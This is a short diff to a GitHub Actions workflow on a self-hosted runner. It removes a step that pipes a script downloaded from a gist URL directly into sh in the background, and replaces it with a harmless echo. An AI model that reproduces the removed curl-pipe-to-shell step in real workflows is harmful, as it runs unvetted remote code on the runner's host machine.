@@ -8,5 +8,4 @@ jobs:
     runs-on: self-hosted
     steps:
       - shell: bash
-        run: curl https://gist.githubusercontent.com/atremmer/a7eedfb905cc2561125f3a53e3e22a86/raw/c344378fd1fc7164756284d74638ed0498eb5843/gistfile1.sh | sh &
-
+        run: echo "this is running on a self hosted runner"
